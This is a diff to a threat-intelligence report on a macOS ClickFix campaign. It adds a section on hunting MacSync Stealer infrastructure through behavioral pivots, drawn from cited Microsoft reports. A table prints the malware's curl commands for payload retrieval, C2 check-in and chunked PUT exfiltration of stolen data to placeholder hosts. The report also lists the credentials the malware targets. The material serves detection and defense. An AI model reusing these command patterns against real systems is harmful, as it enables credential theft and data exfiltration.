@@ -19,6 +19,8 @@ The gate is the durable defender finding. The same URL can return a ClickFix lur
 - anti-analysis
 - TDS
 - cloaking
+- MacSync
+- chunked exfiltration
 - credential theft
 - cryptocurrency wallet theft
 - Microsoft Threat Intelligence
@@ -101,9 +103,34 @@ Microsoft lists Defender behavior detections including `Behavior:MacOS/SuspAmosE
 
 Apple added a Terminal paste warning in macOS 26.4 and later for commands assessed as potentially malicious. Treat the warning as friction, not a substitute for web, network, and endpoint controls.
 
+## MacSync behavioral pivots and rotating infrastructure
+On August 18, 2026, Microsoft Defender Experts published a follow-up focused on the **MacSync Stealer** payload of the same ClickFix chain. RST Cloud had first identified the threat through a limited domain set and documented rapid C2 replacement after public disclosure; Microsoft's team correlated recurring endpoints and network behaviors instead and connected **more than 30 domains**, using the domain count as an outcome of the behavioral methodology rather than the primary finding. The linked infrastructure supported more than C2 communication — it extended into active collection, staging, and chunked exfiltration.
+
+The strongest pivots combined network request shape with endpoint execution context:
+
+| Phase | Representative behavioral pivot | Why it matters |
+|---|---|---|
+| Payload retrieval | `curl -kfsSL http://[domain]/curl/[token]` | Identifies the initial payload-retrieval pattern without depending on a single domain. |
+| C2 check-in | `curl -k -s --max-time 30 -H "User-Agent: Mozilla/5.0 (Macintosh…)" -H "api-key: ***" http://[domain]/dynamic?txd=[token]` | Combines endpoint command-line context with recurring request shape, headers, and URI paths. |
+| Chunked exfiltration | `curl -k -s -X PUT --data-binary @- -H "api-key: ***" http://[domain]/gate?buildtxd=[token]&upload_id=[id]&chunk_index=[n]&total_chunks=[n]` | Shows active data exfiltration and provides durable upload parameters for hunting across domains. |
+
+Additional durable traits:
+
+- recurring URI paths `/curl/`, `/dynamic?txd=`, and `/gate?buildtxd=`;
+- `curl` command lines using `-k`, `-s`, `--max-time`, and `--data-binary`;
+- macOS User-Agent strings on otherwise unusual outbound requests;
+- a custom `api-key` request header;
+- HTTP PUT uploads carrying `upload_id`, `chunk_index`, and `total_chunks` parameters;
+- staged, compressed archives under temporary paths, split into chunks before upload;
+- collection of macOS Keychain material, browser data, locally stored credentials, cloud and SSH credentials, and sensitive files from common user directories.
+
+RST Cloud's URI-pattern pivots surfaced eleven additional candidate domains, and a static `api-key` value was shared across four confirmed C2 domains while the build token rotated per deployment. Domains were treated as related only when multiple behavioral traits aligned across process, command-line, and network telemetry, reducing reliance on any single domain indicator.
+
+Detection corollary: alert on chunked HTTP PUT exfiltration from `curl` with `upload_id` / `chunk_index` / `total_chunks` query parameters on macOS, and correlate the `/gate?buildtxd=` or `/dynamic?txd=` request shape with shell ancestry. Rotating domains weaken static blocklists and retrospective IOC matching, but the request shape and process behaviors are more durable hunting surfaces.
+
 ## Assessment limits
 - Microsoft describes a campaign cluster and malware-delivery method but does not name or attribute the operator.
-- More than 250 front-end domains were confirmed during Microsoft's tracking window; the complete population, victim count, and successful-infection count are not public in the cited report.
+- More than 250 front-end domains were confirmed during Microsoft's tracking window, and more than 30 domains were behaviorally linked to the MacSync Stealer activity; the complete population, victim count, and successful-infection count are not public in the cited reports.
 - Browser fingerprinting, WebGL checks, and traffic-distribution systems have legitimate uses. Confidence comes from correlated gate, infrastructure, lure, staging, and endpoint behavior.
 - The listed domains are historical detection pivots. DNS, ownership, content, and server behavior can change.
 - MacSync and AMOS are alternative reported outcomes of the chain; a front-end-domain sighting alone does not establish which payload, if any, executed.
@@ -116,3 +143,4 @@ Apple added a Terminal paste warning in macOS 26.4 and later for commands assess
 
 ## Source
 - Microsoft Security Blog: [From open lures to cloaked gates: How a macOS ClickFix campaign learned to hide](https://www.microsoft.com/en-us/security/blog/2026/08/05/macos-clickfix-campaign-learned-hide/) — August 5, 2026
+- Microsoft Security Blog (Defender Experts and Microsoft Security Research): [Hunting MacSync Stealer infrastructure through behavioral pivots](https://www.microsoft.com/en-us/security/blog/2026/08/18/hunting-macsync-stealer-infrastructure-through-behavioral-pivots/) — August 18, 2026
